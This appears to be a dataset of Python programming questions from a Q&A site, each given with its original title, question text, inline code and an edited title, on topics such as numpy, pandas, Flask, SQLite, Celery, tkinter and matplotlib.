Indexes of fixed size sub-matrices of numpy array," I am implementing an algorithm which requires me to look at non-overlapping consecutive submatrices within a (strictly two dimensional) numpy array. eg, for the 12 by 12 and looking at 3x3 submatrices, I would want the first 3x3 submatrix to be from the upper left corner: The next along to be given by a[0:3, 3:6] and so on. It doesn't matter if the last such set of indices in each row or column runs off the end of the array - numpy's behavior of simply giving the portion within the slice that exists is sufficient.I want a way to generate these slice indices programatically for arbitrarily sized matrices and submatrices. I currently have this: and similarly to generate y_coords, so that the series of indices is given by itertools.product(xcoords, ycoords).My question is: is there a more direct way to do this, perhaps using numpy.mgrid or some other numpy technique? <code>  >>> a = np.random.randint(20, size=(12, 12)); aarray([[ 4, 0, 12, 14, 3, 8, 14, 12, 11, 18, 6, 6], [15, 13, 2, 18, 15, 15, 16, 2, 9, 16, 6, 4], [18, 18, 3, 8, 1, 15, 14, 13, 13, 13, 7, 0], [ 1, 9, 3, 6, 0, 4, 3, 15, 0, 9, 11, 12], [ 5, 15, 5, 6, 4, 4, 18, 13, 10, 17, 11, 8], [13, 17, 8, 15, 17, 12, 7, 1, 13, 15, 0, 18], [ 2, 1, 11, 12, 3, 16, 11, 9, 10, 15, 4, 16], [19, 11, 10, 7, 10, 19, 7, 13, 11, 9, 17, 8], [14, 14, 17, 0, 0, 0, 11, 1, 10, 14, 2, 7], [ 6, 15, 6, 7, 15, 19, 2, 4, 6, 16, 0, 3], [ 5, 10, 7, 5, 0, 8, 5, 8, 9, 14, 4, 3], [17, 2, 0, 3, 15, 10, 14, 1, 0, 7, 16, 2]]) >>> a[0:3, 0:3]array([[ 4, 0, 12], [15, 13, 2], [18, 18, 3]]) size = 3x_max = a.shape[0]xcoords = range(0, x_max, size)xcoords = zip(xcoords, xcoords[1:])",Indices of fixed size sub-matrices of numpy array
How to check all the elements in a list that has a specific requirement ? Python," I'm doing a homework about a heart game with different version. It says that if we are given a list mycards that contains all the cards that player currently hold in their hands. And play is a single card that representing a potential card.And if all their cards contain either HEART(H) or QUEEN OF SPADES(QS) it is going to return True.For example It will return Truethis is what I have tried But I think my codes just check one QS and one H in the list. How to make the codes that contain all either QS or H? <code>  >>> mycards= ['0H','8H','7H','6H','AH','QS']>>> play = ['QS'] if play[1] == 'H': return Trueif play == 'QS': return Trueelse: return False",How to check all the elements in a list that has a specific requirement?
Sorting associative arrays in python," How can an associative array be sorted by key in Python?I have the following structure: I want to sort by name. Is there a built in function to do this? <code>  people = [ {'name' : 'Bob', 'number' : '123'}, {'name' : 'Bill', 'number' : '234'}, {'name' : 'Dave', 'number' : '567'},]",Sorting associative arrays in Python
"Does Python have a toString() equivalent, and can I convert a db.Model element to String?"," I'm writing a ToDo list app to help myself get started with Python. The app is running on GAE and I'm storing todo items in the Data Store. I want to display everyone's items to them, and them alone. The problem is that the app currently displays all items to all users, so I can see what you write, and you see what I write. I thought casting my todo.author object to a string and seeing if it matches the user's name would be a good start, but I can't figure out how to do that.This is what I have in my main.py In my index.html I had this originally: but I'd like to display items only to the user who created them. I thought of trying to no avail. The list turns up blank. I assumed it is because todo.author is not a string. Can I read the value out as a string, or can I cast the object to String?Thanks!Edit: Here is my Todo class Will changing my author to a StringProperty effect anything negatively? Maybe I can forgo casting altogether. <code>  ... user = users.get_current_user()if user: nickname = user.nickname() todos = Todo.all() template_values = {'nickname':nickname, 'todos':todos}...def post(self): todo = Todo() todo.author = users.get_current_user() todo.item = self.request.get(""item"") todo.completed = False todo.put() self.redirect('/') <input type=""text"" name=""item"" class=""form-prop"" placeholder=""What needs to be done?"" required/>... <ul>{% for todo in todos %} <input type=""checkbox""> {{todo.item}} <hr />{% endfor %}</ul> {% for todo in todos %} {% ifequal todo.author nickname %} <input type=""checkbox""> {{todo.item}} <hr /> {% endifequal %}{% endfor %} class Todo(db.Model): author = db.UserProperty() item = db.StringProperty() completed = db.BooleanProperty() date = db.DateTimeProperty(auto_now_add=True)","Does Python have a toString() equivalent, and can I convert a class to String?"
Variable point size in matplotlib," I want to set a variable marker size in a scatter plot. This is my code: The file I'm importing has three columns. Columns 1 and 2 are stored in data[0] and data[1]) are the (x,y) values and I want each point to have a size relative to column 3 (ie: data[2])I'm using the Canopy IDE by the way. <code>  import numpy as npimport matplotlib.pyplot as pltfrom os import getcwdfrom os.path import join, realpath, dirnamemypath = realpath(join(getcwd(), dirname(__file__)))myfile = 'b34.dat'data = np.loadtxt(join(mypath,myfile), usecols=(1,2,3), unpack=True)fig = plt.figure()ax1 = fig.add_subplot(111)ax1.plot(data[0], data[1], 'bo', markersize=data[2], label='the data')plt.show()",Set variable point size in matplotlib
South - How do I reset migration history and start clean on Django app," This seems to be outdated as the reset command does not seem to be found using the version of South I am using, which is the most recent I believe. Anyways, say you are in production and things get really messy. What is the best current way to start fresh with a Django app as far as cleaning up the migration history? <code> ",Django South - How do I reset migration history and start clean on Django app
tk modal dialog in python," I have a MFC application which runs some embedded Python scripts. I am trying to make one of the dialogs this embedded script creates modal, but I am not having much success. Can anyone point me the way to make a modal dialog? Do I need to use a windows functions for this or only Tk or Python functions are enough?For what I googled looks like the following combination of functions should do the magic, but they dont seem to work the way I was expecting: <code>  focus_set()grab_set()transient(parent)",How to create a modal dialog in tkinter?
Python console and text output from Ping including /n/r," I dont know what is happening, but when I am printing to the console or to a text file, the newline (\n) is not functioning but rather showing in the string. Any idea how to avoid this in both the console and the text file?My code: Output: Hosts File: <code>  import subprocesshosts_file = open(""hosts.txt"",""r"")lines = hosts_file.readlines()for line in lines: line = line.strip() ping = subprocess.Popen([""ping"", ""-n"", ""3"",line],stdout = subprocess.PIPE,stderr = subprocess.PIPE) out, error = ping.communicate() out = out.strip() error = error.strip() output = open(""PingResults.txt"",'a') output.write(str(out)) output.write(str(error)) print(out) print(error)hosts_file.close() b'Pinging 192.168.0.1 with 32 bytes of data:\r\nRequest timed out.\r\nRequest timed out.\r\nRequest timed out.\r\n\r\nPing statistics for 192.168.0.1:\r\n Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),'b''b'Pinging 192.168.0.2 with 32 bytes of data:\r\nRequest timed out.\r\nRequest timed out.\r\nRequest timed out.\r\n\r\nPing statistics for 192.168.0.2:\r\n Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),'b''b'Pinging 192.168.0.3 with 32 bytes of data:\r\nRequest timed out.\r\nRequest timed out.\r\nRequest timed out.\r\n\r\nPing statistics for 192.168.0.3:\r\n Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),'b''b'Pinging 192.168.0.4 with 32 bytes of data:\r\nRequest timed out.\r\nRequest timed out.\r\nRequest timed out.\r\n\r\nPing statistics for 192.168.0.4:\r\n Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),'b''b'Pinging 192.168.0.5 with 32 bytes of data:\r\nRequest timed out.\r\nRequest timed out.\r\nReply from 3.112.3.214: Destination host unreachable.\r\n\r\nPing statistics for 192.168.0.5:\r\n Packets: Sent = 3, Received = 1, Lost = 2 (66%loss),'b'' 192.168.0.1192.168.0.2192.168.0.3192.168.0.4192.168.0.5",Python console and text output from Ping including \n\r
Why doesn't my docopt option have it's default value?," I'm using docopt in an example for a module I'm working on, and all the option default values are working except one. I've modified all the code containing and surrounding the option trying to identify the problem, but it won't take a default value!My options block looks like this: The girders option never has a default value!I re-read this question several times, but it seems unrelated. <code>  Options: --help Show this message and exit --version Show version info and exit -w WIDTH --width=WIDTH The out to out width of the deck (feet) [default: 73] -g GIRDERS --girders=GIRDERS The number of girders [default: 8] -h HEIGHT --height=HEIGHT The height of the girders (inches) [default: 56] -t THICK --thick=THICK The deck thickness (inches) [default: 8] -a ADIM --adim=ADIM The ""A"" dimension, max deck thick @ CL girder [default: 12] -l LSLP --leftslope=LSLP The left-hand deck slope (ft/ft) [default: -0.02] -r RSLP --rightslope=RSLP The right-hand deck slope (ft/ft) [default: -0.02] -c --center Indicates pivot point is at center of bridge -o OFFSET --offset=OFFSET The offset of pivot point from center [default: 0]",Why doesn't my docopt option have its default value?
Run unittest from Python program via command line option," Here is my set up - I would like to be able to run my unit tests by calling a command-line option in prog.py. This way, when I deploy my project, I can deploy the ability to run the unit tests at any time. What do I need in prog.py, or the rest of my project for this to work? <code>  project/ __init__.py prog.py test/ __init__.py test_prog.py python prog.py --unittest",Run unittest from a Python program via a command-line option
Flask Display Json in a Neat Way," I'm creating an API using Flask and have the following code: When viewing /csci/ in the browser, the output looks like this: How do I return this dictionary so that each key and value are on their own line? <code>  @app.route('/<major>/')def major_res(major): course_list = list(client.db.course_col.find({""major"": (major.encode(""utf8"", ""ignore"").upper())})) return json.dumps(course_list, sort_keys=True, indent=4, default=json_util.default) [{ ""course"": ""CSCI052"", ""description"": ""Fundamentals of Computer Science. A solid foundation in functional programming, procedural and data abstraction, recursion and problem-solving. Applications to key areas of computer science, including algorithms and complexity, computer architecture and organization, programming languages, finite automata and computability. This course serves the same role as HM 60 as a prerequisite for upper-division computer science courses at any of the Claremont Colleges. Prerequisite: 51."", ""instructor"": ""Bull, Everett L.,, Jr."", ""name"": "" Fundamentals of Computer Science"", ""number"": 52, ""school"": ""PO"" }]",Display JSON returned from Flask in a neat way
Python: split on either a space or a hyphen?," In Python, how do I split on either a space or a hyphen?Input: Desired output: I can get as far as But I don't know how to split on hyphens as well as spaces and the Python definition of split only seems to specify a string. Do I need to use a regex? <code>  You think we did this un-thinkingly? [""You"", ""think"", ""we"", ""did"", ""this"", ""un"", ""thinkingly""] mystr.split(' ')",Split on either a space or a hyphen?
Python - Storing bools in SQLite database," In my table schema: When connecting to db: I insert a record like so: Along with a parameter dict containing disabled: False.When I read that record back, myfunc is called to convert the BOOLEAN type: Result: 0, <type 'str'> (which of course evaluates as True when I want False)I want bools stored as 1 byte INTEGER, I simply want to convert them to Python bool when reading records (other parts of code expect bools not ints). Is SQLite storing them as strings, or converting them to strings before calling myfunc? Why?P.S. - I tried using sqlite3.register_adapter(bool, int), to no avail. <code>  ... disabled BOOLEAN, ... db = sqlite3.connect(f, detect_types=sqlite3.PARSE_DECLTYPES)sqlite3.register_converter(""BOOLEAN"", myfunc) INSERT INTO mytable (disabled, ...) VALUES (:disabled, ...) def myfunc(x): print x, type(x)",Storing bools in SQLite database
python argmin/argmax: Finding the index of the value which is the min or max," I've got a structure of the form: The first item in each tuple is a list of ranges, and I want to make a generator that provides me the ranges in ascending order based on the starting index. Since the range-lists are already sorted by their starting index this operation is simple: it is just a sorted merge. I'm hoping to do it with good computational efficiency, so I'm thinking that one good way to implicitly track the state of my merge is to simply pop the front off of the list of the tuple which has the smallest starting index in its range list. I can use min() to obtain [0, 1] which is the first one I want, but how do I get the index of it? I have this: which gives me the first item in each list, which I can then min() over somehow, but it fails once any of the lists becomes empty, and also it's not clear how to get the index to use pop() with without looking it back up in the list. To summarize: Want to build generator that returns for me: Or even more efficiently, I only need this data: (the indices of the tuples i want to take the front item of) <code>  >>> items[([[0, 1], [2, 20]], 'zz', ''), ([[1, 3], [5, 29], [50, 500]], 'a', 'b')] [ min (items[i][0]) for i in range(len(items)) ] ([0,1], 'zz', '')([1,3], 'a', 'b')([2,20], 'zz', '')([5,29], 'a', 'b')([50,500], 'a', 'b') [0, 1, 0, 1, 1]",Finding the index of the value which is the min or max in Python
Python argmin/argmax: Finding the index of the value which is the min or max," I've got a structure of the form: The first item in each tuple is a list of ranges, and I want to make a generator that provides me the ranges in ascending order based on the starting index. Since the range-lists are already sorted by their starting index this operation is simple: it is just a sorted merge. I'm hoping to do it with good computational efficiency, so I'm thinking that one good way to implicitly track the state of my merge is to simply pop the front off of the list of the tuple which has the smallest starting index in its range list. I can use min() to obtain [0, 1] which is the first one I want, but how do I get the index of it? I have this: which gives me the first item in each list, which I can then min() over somehow, but it fails once any of the lists becomes empty, and also it's not clear how to get the index to use pop() with without looking it back up in the list. To summarize: Want to build generator that returns for me: Or even more efficiently, I only need this data: (the indices of the tuples i want to take the front item of) <code>  >>> items[([[0, 1], [2, 20]], 'zz', ''), ([[1, 3], [5, 29], [50, 500]], 'a', 'b')] [ min (items[i][0]) for i in range(len(items)) ] ([0,1], 'zz', '')([1,3], 'a', 'b')([2,20], 'zz', '')([5,29], 'a', 'b')([50,500], 'a', 'b') [0, 1, 0, 1, 1]",Finding the index of the value which is the min or max in Python
Inverse algorithm in python," Is there an easy way to make a function to inverse an algorithm for example like this: If you can't make actual code for the function, please recommend me tools that would make this task easier. The function would be only used to inverse algorithms with +, -, * and / <code>  >>> value = inverse(""y = 2*x+3"")>>> print(value)""x = (y-3)/2""",Algorithm to invert strings of algebraic expressions in Python
Writing filenames from a folder into a csv python," I'm trying to parse all files in a folder and write the filenames in a CSV using Python. The code I used is The result I'm getting in the CSV has individual alphabets in one column rather than the entire row name. How to fix that? <code>  import os, csvf=open(""C:/Users/Amber/weights.csv"",'r+')w=csv.writer(f)for path, dirs, files in os.walk(""C:/Users/Amber/Creator""): for filename in files: w.writerow(filename)",Writing filenames from a folder into a csv
python print in format way unknow list length," If I have a 6 length list like this:l = [""AA"",""BB"",""CC"",""DD""]I can print it with:print ""%-2s %-2s %-2s %-2s"" % tuple(l)The output will be:AA BB CC DDBut what if the list l could be in any length? Is there a way to print the list in the same format with unknown number of elements? <code> ",python print in format way unknown list length
Sqlalchemy commit changes to object (modified using its dictionary)," I am developing a multiplayer game. When I use an object from inventory, it should update the user creature's stats with the values of the attributes of an object. This is my code: Now, this doesn't commit things properly for some reason, so I tried: Which works, but is not very convenient (since I would need a big if statement to updated the different stats of the creature)So I tried: I get 100 in logs, but no changes, so I tried: Still '100' in logs, but no changes, so I tried: Which still writes 100 in the logs, but doesn't commit changes to the database. Now, this is weird, since it only differ by the working version for the fact that it has this line on top: Summary: If I modify an attribute directly, commit works fine. Instead, if I modify an attribute through the class' dictionary, then, no matter how I modify it afterwards, it doesn't commit changes to the db.Any ideas?Thanks in advanceUPDATE 1:Also, this updates Health in the db, but not Hunger: So just accessing the dictionary is not a problem for attributes in general, but modifying an attribute through the dictionary, prevents the changes to that attributes from being committed.Update 2:As a temporary fix, I've overridden the function __set_item__(self) in the class Creatures: So that the new code for 'use object' is: Update 3: By having a look at the suggestions in the answers, I settled down for this solution:In Creatures In the other method <code>  try: obj = self._get_obj_by_id(self.query['ObjectID']).first() # Get user's current creature cur_creature = self.user.get_current_creature() # Applying object attributes to user attributes for attribute in obj.attributes: cur_creature.__dict__[str(attribute.Name)] += attribute.Value dbObjs.session.commit()except (KeyError, AttributeError) as err: self.query_failed(err) cur_creature.Health = 100logging.warning(cur_creature.Health)dbObjs.session.commit() cur_creature.__dict__['Health'] = 100logging.warning(cur_creature.Health)dbObjs.session.commit() cur_creature.__dict__['Health'] = 100cur_creature.Health = cur_creature.__dict__['Health']logging.warning(cur_creature.Health)dbObjs.session.commit() cur_creature.__dict__['Health'] = 100cur_creature.Health = 100logging.warning(cur_creature.Health)dbObjs.session.commit() cur_creature.__dict__['Health'] = 100 cur_creature.__dict__['Hunger'] = 0cur_creature.Health = 100cur_creature.Hunger = 0logging.warning(cur_creature.Health)dbObjs.session.commit() def __setitem__(self, key, value): if key == ""Health"": self.Health = value elif key == ""Hunger"": self.Hunger = value try: obj = self._get_obj_by_id(self.query['ObjectID']).first() # Get user's current creature cur_creature = self.user.get_current_creature() # Applying object attributes to user attributes for attribute in obj.attributes: cur_creature[str(attribute.Name)] += attribute.Value dbObjs.session.commit()except (KeyError, AttributeError) as err: self.query_failed(err) def __setitem__(self, key, value): if key in self.__dict__: setattr(self, key, value) else: raise KeyError(key) # Applying object attributes to user attributes for attribute in obj.attributes: cur_creature[str(attribute.Name)] += attribute.Value",SQLAlchemy commit changes to object modified through __dict__
Duck Typing in Python," Here is some Ruby code: And, I translated it to Python: The result is the same. Does this mean my Python code is using duck-typing? I couldn't find a duck-typing example, so I thought there may be no duck-typing in Python. There is code in Wikipedia, but I couldn't understand it. <code>  class Duck def help puts ""Quaaaaaack!"" endendclass Person def help puts ""Heeeelp!"" endenddef InTheForest x x.helpenddonald = Duck.newjohn = Person.newprint ""Donald in the forest: ""InTheForest donaldprint ""John in the forest: ""InTheForest john import sysclass Duck: def help(): print(""Quaaaaaack!"")class Person: def help(): print(""Heeeelp!"")def InTheForest(x): x.help()donald = Duck()john = Person()sys.stdout.write(""Donald in the forest: "")InTheForest(donald)sys.stdout.write(""John in the forest: "")InTheForest(john)",Is this duck-typing in Python?
What Unicode symbols are accepted in Python3 variable names?, I want to use a larger variety of Unicode symbols for variable names in my Python3 scripts. What characters are acceptable to use in Python3 variable names?I recently started using Unicode symbols (such as Greek and Asian symbols) for code obfuscation. <code> ,What Unicode symbols are accepted in Python 3 variable names?
Reporting results of long-running Celery tasks," ProblemI've segmented a long-running task into logical subtasks, so I can report the results of each subtask as it completes. However, I'm trying to report the results of a task that will effectively never complete (instead yielding values as it goes), and am struggling to do so with my existing solution.BackgroundI'm building a web interface to some Python programs I've written. Users can submit jobs through web forms, then check back to see the job's progress.Let's say I have two functions, each accessed via separate forms:med_func: Takes ~1 minute to execute, results are passed off to render(), which produces additional data.long_func: Returns a generator. Each yield takes on the order of 30 minutes, and should be reported to the user. There are so many yields, we can consider this iterator as infinite (terminating only when revoked).Code, current implementationWith med_func, I report results as follows:On form submission, I save an AsyncResult to a Django session: The Django view for the results page accesses this AsyncResult. When a task has completed, results are saved into an object that is passed as context to a Django template. This solution only works when the function actually terminates. I can't chain together logical subtasks of long_func, because there are an unknown number of yields (each iteration of long_func's loop may not produce a result).QuestionIs there any sensible way to access yielded objects from an extremely long-running Celery task, so that they can be displayed before the generator is exhausted? <code>  task_result = med_func.apply_async([form], link=render.s()) request.session[""task_result""] = task_result def results(request): """""" Serve (possibly incomplete) results of a session's latest run. """""" session = request.session try: # Load most recent task task_result = session[""task_result""] except KeyError: # Already cleared, or doesn't exist if ""results"" not in session: session[""status""] = ""No job submitted"" else: # Extract data from Asynchronous Tasks session[""status""] = task_result.status if task_result.ready(): session[""results""] = task_result.get() render_task = task_result.children[0] # Decorate with rendering results session[""render_status""] = render_task.status if render_task.ready(): session[""results""].render_output = render_task.get() del(request.session[""task_result""]) # Don't need any more return render_to_response('results.html', request.session)",Reporting yielded results of long-running Celery task
Python: How do you stop numpy from multithreading?," I have to run jobs on a regular basis on compute servers that I share with others in the department and when I start 10 jobs, I really would like it to just take 10 cores and not more; I don't care if it takes a bit longer with a single core per run: I just don't want it to encroach on the others' territory, which would require me to renice the jobs and so on. I just want to have 10 solid cores and that's all.I am using Enthought 7.3-1 on Redhat, which is based on Python 2.7.3 and numpy 1.6.1, but the question is more general. <code> ",How do you stop numpy from multithreading?
how to find the index of the first character in a string in python?," Scenario: In this case the ""H"" index is '3'. But I need a more general method such that for any string variable 'a' takes I need to know the index of the first character?Alternative scenario: <code>  >>> a=' Hello world'index = 3 >>> a='\tHello world'index = 1",how to find the index of the first non-whitespace character in a string in python?
Outputting difference in two pandas dataframes side by side - highlighting the difference," I am trying to highlight exactly what changed between two dataframes.Suppose I have two Python Pandas dataframes: My goal is to output an HTML table that:Identifies rows that have changed (could be int, float, boolean, string)Outputs rows with same, OLD and NEW values (ideally into an HTML table) so the consumer can clearly see what changed between two dataframes: I suppose I could do a row by row and column by column comparison, but is there an easier way? <code>  ""StudentRoster Jan-1"":id Name score isEnrolled Comment111 Jack 2.17 True He was late to class112 Nick 1.11 False Graduated113 Zoe 4.12 True ""StudentRoster Jan-2"":id Name score isEnrolled Comment111 Jack 2.17 True He was late to class112 Nick 1.21 False Graduated113 Zoe 4.12 False On vacation ""StudentRoster Difference Jan-1 - Jan-2"": id Name score isEnrolled Comment112 Nick was 1.11| now 1.21 False Graduated113 Zoe 4.12 was True | now False was """" | now ""On vacation""",Compare two DataFrames and output their differences side-by-side
Outputting difference in two Pandas dataframes side by side - highlighting the difference," I am trying to highlight exactly what changed between two dataframes.Suppose I have two Python Pandas dataframes: My goal is to output an HTML table that:Identifies rows that have changed (could be int, float, boolean, string)Outputs rows with same, OLD and NEW values (ideally into an HTML table) so the consumer can clearly see what changed between two dataframes: I suppose I could do a row by row and column by column comparison, but is there an easier way? <code>  ""StudentRoster Jan-1"":id Name score isEnrolled Comment111 Jack 2.17 True He was late to class112 Nick 1.11 False Graduated113 Zoe 4.12 True ""StudentRoster Jan-2"":id Name score isEnrolled Comment111 Jack 2.17 True He was late to class112 Nick 1.21 False Graduated113 Zoe 4.12 False On vacation ""StudentRoster Difference Jan-1 - Jan-2"": id Name score isEnrolled Comment112 Nick was 1.11| now 1.21 False Graduated113 Zoe 4.12 was True | now False was """" | now ""On vacation""",Compare two DataFrames and output their differences side-by-side
Python and regexp - data extraction," I have following text processed by my code in Python: Could you advice me how to extract data from within <td>?My idea is to put it in a CSV file with the following format: some link, some data 1, some data 2, some data 3.I expect that without regular expression it might be hard but truly I still struggle against regular expressions.I used my code more or less in following manner: and ideally would be to get each td contend in some array. Html above is a result from python. <code>  <td><a href=""http://www.linktosomewhere.net"" title=""title here"">some link</a><br />some data 1<br />some data 2<br />some data 3</td> tabulka = subpage.find(""table"")for row in tabulka.findAll('tr'): col = row.findAll('td')print col[0]",Extracting data from HTML with Python
What's the order of func_closure entries?," I have a lambda object that is created in this function: Using func_closure of the lambda function object I can access the closure scope of the lambda function: A closer look (at the cell_contents attribute of each cell object) shows me this: That lambda function was created by this call: As you can see, the order does not match the argument order of the function or the order in which the arguments are used inside the lambda. While I could easily find out which element is what based on its type/content, I'd like to do it in a cleaner way.So my question is: How can I associate it with their original variable names (or at least positions in case of function arguments)? <code>  def add_url_rule(self, rule, endpoint=None, view_func=None, **options): self.record(lambda s: s.add_url_rule(rule, endpoint, view_func, **options)) (<cell at 0x3eb89f0: str object at 0x2fb4378>, <cell at 0x3eb8a28: function object at 0x3cb3a28>, <cell at 0x3eb8a60: str object at 0x3ebd090>, <cell at 0x3eb8b08: dict object at 0x3016ec0>) >>> [c.cell_contents for c in func.func_closure]['categoryDisplay', <function indico.web.flask.util.RHCategoryDisplay>, '/<categId>/', {}] add_url_rule('/<categId>/', 'categoryDisplay', rh_as_view(RHCategoryDisplay))",How to map func_closure entries to variable names?
python multiprocessing class in multiprocess," This is a newbie question:A class is an object, so I can create a class called pippo() and inside of this add function and parameter, I don't understand if the functions inside of pippo are executed from up to down when I assign x=pippo() or I must call them as x.dosomething() outside of pippo.Working with Python's multiprocessing package, is it better to define a big function and create the object using the target argument in the call to Process(), or to create your own process class by inheriting from Process class? <code> ",Using Python's multiprocessing.Process class
a (presumably basic) web scraping of http://www.ssa.gov/cgi-bin/popularnames.cgi," I am very new to Python (and web scraping). Let me ask you a question. Many website actually do not report its specific URLs in Firefox or other browsers. For example, Social Security Admin shows popular baby names with ranks (since 1880), but the url does not change when I change the year from 1880 to 1881. It is constantly,http://www.ssa.gov/cgi-bin/popularnames.cgiBecause I don't know the specific URL, I could not download the webpage using urllib.In this page source, it includes:<input type=""text"" name=""year"" id=""yob"" size=""4"" value=""1880"">So presumably, if I can control this ""year"" value (like, ""1881"" or ""1991""), I can deal with this problem. Am I right? I still don't know how to do it.Can anybody tell me the solution for this please?If you know some websites that may help my study, please let me know.THANKS! <code> ",a (presumably basic) web scraping of http://www.ssa.gov/cgi-bin/popularnames.cgi in urllib
Python Pandas Conditional Sums," Using sample data: df I'm trying to figure out how to group the data by key1 and sum only the data1 values where key2 equals 'one'.Here's what I've tried But this gives me a dataframe with 'None' values Any ideas here? I'm looking for the Pandas equivalent of the following SQL: FYI - I've seen conditional sums for pandas aggregate but couldn't transform the answer provided there to work with sums rather than counts.Thanks in advance <code>  df = pd.DataFrame({'key1' : ['a','a','b','b','a'], 'key2' : ['one', 'two', 'one', 'two', 'one'], 'data1' : np.random.randn(5), 'data2' : np. random.randn(5)}) data1 data2 key1 key20 0.361601 0.375297 a one1 0.069889 0.809772 a two2 1.468194 0.272929 b one3 -1.138458 0.865060 b two4 -0.268210 1.250340 a one def f(d,a,b): d.ix[d[a] == b, 'data1'].sum()df.groupby(['key1']).apply(f, a = 'key2', b = 'one').reset_index() index key1 00 a None1 b None SELECT Key1, SUM(CASE WHEN Key2 = 'one' then data1 else 0 end)FROM dfGROUP BY key1",Python Pandas Conditional Sum with Groupby
how can i convert Decimal field to float in python django," I have this form field: When I post it I get unicode data: the result is <type 'unicode'>How can I convert that to float? I want to perform an arithmetic operation on the result.If I do this: Then I get this float() argument must be a string or a number <code>  area = forms.DecimalField(max_digits=20) raise Exception(type(a.get('area',)) float(a.get('area', '0'))",How can i convert DecimalField to float in Python Django?
Remove vowels from string-," in this code I am trying to create a function anti_vowel that will remove all vowels (aeiouAEIOU) from a string. I think it should work ok, but when I run it, the sample text ""Hey look Words!"" is returned as ""Hy lk Words!"". It ""forgets"" to remove the last 'o'. How can this be? <code>  text = ""Hey look Words!""def anti_vowel(text): textlist = list(text) for char in textlist: if char.lower() in 'aeiou': textlist.remove(char) return """".join(textlist)print anti_vowel(text)","Loop ""Forgets"" to Remove Some Items"
Remove vowels from string," in this code I am trying to create a function anti_vowel that will remove all vowels (aeiouAEIOU) from a string. I think it should work ok, but when I run it, the sample text ""Hey look Words!"" is returned as ""Hy lk Words!"". It ""forgets"" to remove the last 'o'. How can this be? <code>  text = ""Hey look Words!""def anti_vowel(text): textlist = list(text) for char in textlist: if char.lower() in 'aeiou': textlist.remove(char) return """".join(textlist)print anti_vowel(text)","Loop ""Forgets"" to Remove Some Items"
How to run another python program without holding up original?," What command in Python can be used to run another Python program?It should not wait for the child process to terminate. Instead, it should continue on. It also does not need to remember its child processes. <code> ",How to run another Python program without holding up original
Python os.chdir is changing the directory," I am trying to change the current working directory in python using os.chdir. I have the following code: However, when I run it, it seems to change the directory, as it comes out with the following error message: Can anyone help me? <code>  import osos.chdir(""C:\Users\Josh\Desktop\20130216"") Traceback (most recent call last):File ""C:\Users\Josh\Desktop\LapseBot 1.0\LapseBot.py"", line 3, in <module>os.chdir(""C:\Users\Josh\Desktop\20130216"")WindowsError: [Error 2] The system cannot find the file specified 'C:\\Users\\Josh\\Desktop\x8130216'",Python os.chdir is modifying the passed directory name
Set up python simpleHTTPserver on windows," I want to set up Python SimpleHTTPServer on Windows XP. I have Python installed on my computer. I am executing the following command: But I am getting the error: Is SimpleHTTPServer for Python available on Windows? If yes, what do I do to set up the server? <code>  python -m SimpleHTTPServer 8888 C:\Python33\python.exe: No module named SimpleHTTPServer",Set up Python simpleHTTPserver on Windows
Set up python simpleHTTPserver on Windows," I want to set up Python SimpleHTTPServer on Windows XP. I have Python installed on my computer. I am executing the following command: But I am getting the error: Is SimpleHTTPServer for Python available on Windows? If yes, what do I do to set up the server? <code>  python -m SimpleHTTPServer 8888 C:\Python33\python.exe: No module named SimpleHTTPServer",Set up Python simpleHTTPserver on Windows
"Getting ""working outside of request context"" error when accessing session during unit test in Flask?"," I am getting working outside of request context when trying to access session in a test. How can I set up a context when I'm testing something that requires one? <code>  import unittestfrom flask import Flask, sessionapp = Flask(__name__)@app.route('/')def hello_world(): t = Test() hello = t.hello() return helloclass Test: def hello(self): session['h'] = 'hello' return session['h']class MyUnitTest(unittest.TestCase): def test_unit(self): t = tests.Test() t.hello()",Testing code that requires a Flask app or request context
How to split a string with using an empty separator in Python," What is a good way to do some_string.split('') in python? This syntax gives an error: I would like to obtain: <code>  a = '1111'a.split('')ValueError: empty separator ['1', '1', '1', '1']",How to split a string using an empty separator in Python
Python: arrays used as indices must be of integer (or boolean) type," Errors are like this: Codes are like this: I am using scikit-learn package, X-train, y_train are in LIBSVM format, X is the feature:value pair, y_train is the target/label, X_train is in CSR matric format, the shrink_threshold does not support CSR sparse matrix, so I add .todense() to X_train, then I got this error, could anyone help me fix this? Thanks a lot! <code>  Traceback (most recent call last): File ""NearestCentroid.py"", line 53, in <module> clf.fit(X_train.todense(),y_train) File ""/usr/local/lib/python2.7/dist-packages/scikit_learn-0.13.1-py2.7-linux-i686.egg/sklearn/neighbors/nearest_centroid.py"", line 115, in fit variance = np.array(np.power(X - self.centroids_[y], 2))IndexError: arrays used as indices must be of integer (or boolean) type distancemetric=['euclidean','l2']for mtrc in distancemetric:for shrkthrshld in [None]:#shrkthrshld=0#while (shrkthrshld <=1.0): clf = NearestCentroid(metric=mtrc,shrink_threshold=shrkthrshld) clf.fit(X_train.todense(),y_train) y_predicted = clf.predict(X_test.todense())",Arrays used as indices must be of integer (or boolean) type
autfmt_xdate deletes x axis labels of all subplots," I use autofmt_xdate to plot long x-axis labels in a readable way. The problem is, when I want to combine different subplots, the x-axis labeling of the other subplots disappears, which I do not appreciate for the leftmost subplot in the figure below (two rows high). Is there a way to prevent autofmt_xdate from quenching the other x-axis labels? Or is there another way to rotate the labels? As you can see I experimented with xticks and ""rotate"" as well, but the results were not satisfying because the labels were rotated around their center, which resulted in messy labeling.Script that produces plot below:  <code>  from matplotlib import pyplot as pltfrom numpy import arangeimport numpyfrom matplotlib import rcrc(""figure"",figsize=(15,10))#rc('figure.subplot',bottom=0.1,hspace=0.1)rc(""legend"",fontsize=16)fig = plt.figure()Test_Data = numpy.random.normal(size=20)fig = plt.figure()Dimension = (2,3)plt.subplot2grid(Dimension, (0,0),rowspan=2)plt.plot(Test_Data)plt.subplot2grid(Dimension, (0,1),colspan=2)for i,j in zip(Test_Data,arange(len(Test_Data))): plt.bar(i,j)plt.legend(arange(len(Test_Data)))plt.subplot2grid(Dimension, (1,1),colspan=2)xticks = [r""%s (%i)"" % (a,b) for a,b in zip(Test_Data,Test_Data)]plt.xticks(arange(len(Test_Data)),xticks)fig.autofmt_xdate()plt.ylabel(r'$Some Latex Formula/Divided by some Latex Formula$',fontsize=14)plt.plot(Test_Data)#plt.setp(plt.xticks()[1],rotation=30)plt.tight_layout()#plt.show()",autofmt_xdate deletes x-axis labels of all subplots
